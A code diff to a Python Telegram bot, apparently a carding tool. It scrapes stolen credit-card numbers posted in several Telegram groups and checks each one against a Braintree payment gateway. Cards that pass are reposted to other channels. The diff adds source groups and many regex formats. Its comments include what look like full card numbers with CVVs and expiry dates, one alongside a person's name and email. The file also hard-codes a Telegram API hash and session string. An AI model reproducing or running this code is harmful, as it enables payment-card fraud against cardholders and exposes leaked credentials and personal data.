@@ -1,8 +1,10 @@
 import re  
 import asyncio  
 import logging  
+import socket  
 from telethon import TelegramClient, events  
 from telethon.sessions import StringSession  
+from telethon.errors import AuthKeyDuplicatedError  
 from cc_checker import check_cc  
 
 # Configure logging
@@ -11,10 +13,10 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 # API Configuration  
 api_id = 25031007  # Replace with your actual API ID
 api_hash = "68029e5e2d9c4dd11f600e1692c3acaa"  # Replace with your actual API hash
-session_string = "1BVtsOHkBuwteo891QQt3wAC5SA4vCJcYzdXXHES6QtyRuGGgEzsxyJdzYzD573DvrPi0Z3qqTR5AJWGOZhcKHAV56VZ8MEYw-BADl48k_kCFOZusv2stf1hJPRZQ8G8fxLiWxwnWz_WjgHSLvYxtMmqrUUqXusu1xcZO6BmRoHVMth3xXfdqvXtbEgP6DIQ0fIVLQdFxj3EcE-Q8cuHTb6peDQ9QkV04DME8U51YeEw0AH5156nifS6sKvQLkLmncxyC3jkrY90tKCmyOyieXvDO9UAW-nLOSEg_RbJF0wqduCuzNpl1_kJ8azZlHt2pfpKj140t1VMHE0-HIPxl8Dnc0U1lACQ="  # Replace with your actual Telethon session string
+session_string = "1BVtsOHkBuwteo891QQt3wAC5SA4vCJcYzdXXHES6QtyRuGGgEzsxyJdzYzD573DvrPi0Z3qqTR5AJWGOZhcKHAV56VZ8MEYw-BADl48k_kCFOZusv2stf1hJPRZQ8G8fxLiWxwnWz_WjgHSLvYxtMmqrUUqXusu1xcZO6BmRoHVMth3xXfdqvXtbEgP6DIQ0fIVLQdFxj3EcE-Q8cuHTb6peDQ9QkV04DME8U51YeEw0AH5156nifS6sKvQLkLmncxyC3jkrY90tKCmyOyieXvDO9UAW-nLOSEg_RbJF0wqduCuzNpl1_kJ8azZlHt2pfpKj140t1VMHE0-HIPxl8Dnc0U1lACQ="  # Replace with your new Telethon session string
 
 # Sources Configuration - add as many as needed
-source_groups = [-1001878543352]  # Add source group IDs if needed
+source_groups = [-1002410570317, -1001878543352, -1002540516113, -1002174077087]  # Add source group IDs if needed
 source_channels = []  # Add source channel IDs if needed
 
 # Target channels where scraped CCs will be sent (you can add multiple IDs)
@@ -28,12 +30,65 @@ check_lock = asyncio.Lock()
 
 # Enhanced CC patterns to capture more formats
 cc_patterns = [
+    # New Format 1: 𝗖𝗖 ➼ 5424322335125154|07|27|363
+    r'(?:𝗖𝗖|CC)\s*➼\s*(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
+    
+    r'[•\*\-]\s*CC\s+(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
+
+    # Format 2 & 9 & 10: 5262190163068118|01|2029|923 or 4432290821938088|07|28|183 or 5517760000228621|08|27|747
+    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
+
+    # Format 3: 5563800132516965\n03/27\n196
+    r'(\d{13,16})\n(\d{2})/(\d{2,4})\n(\d{3,4})',
+
+    # Format 4 & 11: 4628880202243142 10/27 501 or 5168404154402888 03/26 416
+    r'(\d{13,16})\s(\d{2})/(\d{2,4})\s(\d{3,4})',
+
+    # Format 5: CCNUM: 4622630013568831 CVV: 577 EXP: 12/2027
+    r'CCNUM:?\s*(\d{13,16})\s*CVV:?\s*(\d{3,4})\s*EXP:?\s*(\d{1,2})/(\d{2,4})',
+
+    # Format 6: NR: 4130220014499932 Holder: Merre Friend CVV: 703 EXPIRE: 03/28
+    r'NR:?\s*(\d{13,16})\s*(?:Holder:.*?\s*)?CVV:?\s*(\d{3,4})\s*EXPIRE:?\s*(\d{1,2})/(\d{2,4})',
+
+    # Format 7: Card: 5289460011885479 Exp. month: 9 Exp. year: 25 CVV: 350
+    r'Card:?\s*(\d{13,16})\s*Exp\. month:?\s*(\d{1,2})\s*Exp\. year:?\s*(\d{2,4})\s*CVV:?\s*(\d{3,4})',
+
+    # Format 8: 4019240106255832|03/26|987|小関美華|Doan|コセキ ミカ|k.mika.0801@icloud.com|0
+    r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})(?:\|.*)?',
+
+    # New Format 2: ╔ ● CC: 4491042736323072|12|2030|105
+    r'[╔]\s*[●]\s*CC:?\s*(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
+
+    # Format 1: • CC  5418792156740992|04|2027|267
+    r'[•\*\-]\s*CC\s+(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
+
+    # Format 2 & 9 & 10: 5262190163068118|01|2029|923 or 4432290821938088|07|28|183 or 5517760000228621|08|27|747
+    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
+
+    # Format 3: 5563800132516965\n03/27\n196
+    r'(\d{13,16})\n(\d{2})/(\d{2,4})\n(\d{3,4})',
+
+    # Format 4 & 11: 4628880202243142 10/27 501 or 5168404154402888 03/26 416
+    r'(\d{13,16})\s(\d{2})/(\d{2,4})\s(\d{3,4})',
+
+    # Format 5: CCNUM: 4622630013568831 CVV: 577 EXP: 12/2027
+    r'CCNUM:?\s*(\d{13,16})\s*CVV:?\s*(\d{3,4})\s*EXP:?\s*(\d{1,2})/(\d{2,4})',
+
+    # Format 6: NR: 4130220014499932 Holder: Merre Friend CVV: 703 EXPIRE: 03/28
+    r'NR:?\s*(\d{13,16})\s*(?:Holder:.*?\s*)?CVV:?\s*(\d{3,4})\s*EXPIRE:?\s*(\d{1,2})/(\d{2,4})',
+
+    # Format 7: Card: 5289460011885479 Exp. month: 9 Exp. year: 25 CVV: 350
+    r'Card:?\s*(\d{13,16})\s*Exp\. month:?\s*(\d{1,2})\s*Exp\. year:?\s*(\d{2,4})\s*CVV:?\s*(\d{3,4})',
+
+    # Format 8: 4019240106255832|03/26|987|小関美華|Doan|コセキ ミカ|k.mika.0801@icloud.com|0
+    r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})(?:\|.*)?',
+
+    # Existing patterns for broader coverage
     r'(\d{13,16})[\s|/|\-|~]?\s*(\d{1,2})[\s|/|\-|~]?\s*(\d{2,4})[\s|/|\-|~]?\s*(\d{3,4})',
     r'(\d{13,16})\s(\d{1,2})\s(\d{2,4})\s(\d{3,4})',
     r'(\d{13,16})\n(\d{1,2})\n(\d{2,4})\n(\d{3,4})',
     r'(\d{13,16})\n(\d{1,2})[/|-](\d{2,4})\n(\d{3,4})',
     r'(\d{13,16})[:|=|>]?(\d{1,2})[:|=|>]?(\d{2,4})[:|=|>]?(\d{3,4})',
-    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
     r'cc(?:num)?:[\s]?(\d{13,16})[\s\n]+(?:exp|expiry|expiration):[\s]?(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2):[\s]?(\d{3,4})',
     r'(?:cc|card)(?:num)?[\s:]+(\d{13,16})[\s\n]+(?:exp|expiry|expiration)[\s:]+(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2)[\s:]+(\d{3,4})',
     r'(\d{13,16})(?:\s*(?:card|exp|expiry|expiration)\s*(?:date)?\s*[:|=|-|>])?\s*(\d{1,2})(?:\s*[/|-])?\s*(\d{2,4})(?:\s*(?:cvv|cvc|cv2)\s*[:|=|-|>])?\s*(\d{3,4})',
@@ -49,10 +104,17 @@ def format_cc(match):
     groups = match.groups()
     
     if len(groups) == 4:
-        if len(groups[2]) >= 3 and len(groups[2]) <= 4 and len(groups[3]) == 2:
-            cc, cvv, mm, yy = groups
-        else:
-            cc, mm, yy, cvv = groups
+        # Handle patterns where month and year are separate or combined
+        if '/' in groups[1]:  # For patterns like mm/yy (e.g., 03/26)
+            cc, month_year, cvv = groups[0], groups[1], groups[3]
+            mm, yy = month_year.split('/')
+        elif '/' in groups[2]:  # For patterns like CCNUM: CVV: EXP: mm/yy
+            cc, cvv, mm, yy = groups[0], groups[1], groups[2], groups[3]
+        else:  # For patterns like mm|yy
+            if len(groups[2]) >= 3 and len(groups[2]) <= 4 and len(groups[3]) == 2:
+                cc, cvv, mm, yy = groups
+            else:
+                cc, mm, yy, cvv = groups
     else:
         return None
     
@@ -82,13 +144,16 @@ def get_sources():
 async def cc_scraper(event):  
     text = event.raw_text  
     found_ccs = set()  
-  
+    
+    # Log the raw message for debugging
+    logging.info(f"Raw message text: {text}")
+    
     for pattern in cc_patterns:  
-        for match in re.finditer(pattern, text):  
+        for match in re.finditer(pattern, text, re.MULTILINE | re.DOTALL):  
             formatted_cc = format_cc(match)
             if formatted_cc:  
                 found_ccs.add(formatted_cc)
-  
+    
     if found_ccs:  
         for cc in found_ccs:  
             async with check_lock:  # Ensure only one check at a time
@@ -106,11 +171,11 @@ async def cc_scraper(event):
                                f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
                                f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
                                f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
-                               f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
+                               f"[ϟ]�_I𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                                f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                                f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
                                f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
-                               f"[み]𝗢𝗪𝗡𝗘𝗥 -» <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤͟𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤͟➤⃟🔥✘</a>")
+                               f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
                     
                     # Send the message to all target channels
                     if target_channels:
@@ -129,24 +194,32 @@ async def cc_scraper(event):
                 logging.info("Waiting 10 seconds before next check...")
                 await asyncio.sleep(10)
             logging.info("Lock released, proceeding to next check if any.")
+    else:
+        logging.info("No credit cards found in the message.")
 
 # Run Client  
 async def main():  
-    await client.start()  
-    logging.info("✅ CC Scraper Running...")
-    
-    sources = get_sources()
-    if sources:
-        logging.info(f"✅ Monitoring {len(sources)} source(s)")
-    else:
-        logging.info("⚠️ No sources specified. Will monitor all chats the account has access to.")
-    
-    if target_channels:
-        logging.info(f"✅ Found CCs will be sent to {len(target_channels)} channel(s)")
-    else:
-        logging.info("⚠️ No target channels specified. Found CCs will be printed to console only.")
+    try:
+        await client.start()  
+        logging.info("✅ CC Scraper Running...")
+        logging.info(f"Server IP: {socket.gethostbyname(socket.gethostname())}")
         
-    await client.run_until_disconnected()  
+        sources = get_sources()
+        if sources:
+            logging.info(f"✅ Monitoring {len(sources)} source(s)")
+        else:
+            logging.info("⚠️ No sources specified. Will monitor all chats the account has access to.")
+        
+        if target_channels:
+            logging.info(f"✅ Found CCs will be sent to {len(target_channels)} channel(s)")
+        else:
+            logging.info("⚠️ No target channels specified. Found CCs will be printed to console only.")
+            
+        await client.run_until_disconnected()  
+    except AuthKeyDuplicatedError as e:
+        logging.error(f"AuthKeyDuplicatedError: {e}")
+        logging.error("The session was used from multiple IPs simultaneously. Please generate a new session string and ensure exclusive usage.")
+        raise  # Re-raise to stop the script, or handle as needed
 
 if __name__ == "__main__":  
     asyncio.run(main())
